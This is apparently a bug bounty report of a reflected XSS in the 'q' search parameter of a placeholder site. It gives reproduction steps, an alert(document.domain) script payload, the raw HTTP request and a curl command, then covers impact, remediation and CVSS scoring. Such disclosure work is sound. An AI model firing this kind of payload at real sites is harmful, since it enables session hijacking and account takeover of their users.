# Bug Bounty Report — XSS in Search Parameter

## Summary
A reflected cross-site scripting (XSS) vulnerability exists in the search functionality at `https://target.com/search`. The search query parameter `q` is reflected in the HTML response without proper sanitization, allowing an attacker to inject arbitrary JavaScript code that executes in the victim's browser context.

## Severity: High (CVSS 3.1)
**CVSS Vector:** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` — Score: 8.1

## Affected Endpoint
- **URL:** `https://target.com/search?q=<payload>`
- **Method:** GET
- **Parameter:** `q`

## Steps to Reproduce
1. Navigate to `https://target.com/search?q=test`
2. Observe that the search term "test" is reflected in the page HTML
3. Send the following payload: `<script>alert(document.domain)</script>`
4. A JavaScript alert box appears showing the target domain
5. This confirms arbitrary script execution in the victim's browser

## Proof of Concept

### Request
```http
GET /search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml
```

### Response (excerpt)
```html
<div class="search-results">
    <h2>Results for: <script>alert(document.domain)</script></h2>
    <!-- The payload is reflected unescaped in the HTML -->
</div>
```

### Curl Command
```bash
curl -k "https://target.com/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E"
```

## Impact
An attacker can craft a malicious URL containing the XSS payload and send it to victims via email, social media, or other channels. When a victim clicks the link:
- The attacker can steal session cookies and hijack the victim's account
- The attacker can perform actions on behalf of the victim
- The attacker can redirect the victim to a malicious website
- The attacker can steal sensitive information displayed on the page

**Business Impact:** Account takeover of any user who clicks the crafted link, leading to unauthorized access and potential data breach.

## Remediation
1. **Encode all user input** before reflecting it in HTML responses using context-appropriate encoding (HTML entity encoding)
2. **Implement Content Security Policy (CSP)** headers to mitigate the impact of XSS
3. **Use templating engines** with automatic escaping enabled
4. **Validate and sanitize** input on both client and server side

## References
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: Improper Neutralization of Input During Web Page Generation
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting

## CVSS Calculation Justification
- **AV:N** — Attack Vector is Network (remote exploitation)
- **AC:L** — Attack Complexity is Low (no special conditions needed)
- **PR:N** — Privileges Required: None (unauthenticated exploitation)
- **UI:R** — User Interaction: Required (victim must click the link)
- **S:C** — Scope: Changed (impacts resources beyond the vulnerable component)
- **C:H** — Confidentiality: High (session hijacking exposes all user data)
- **I:L** — Integrity: Low (attacker can modify limited data)
- **A:N** — Availability: None (no availability impact)
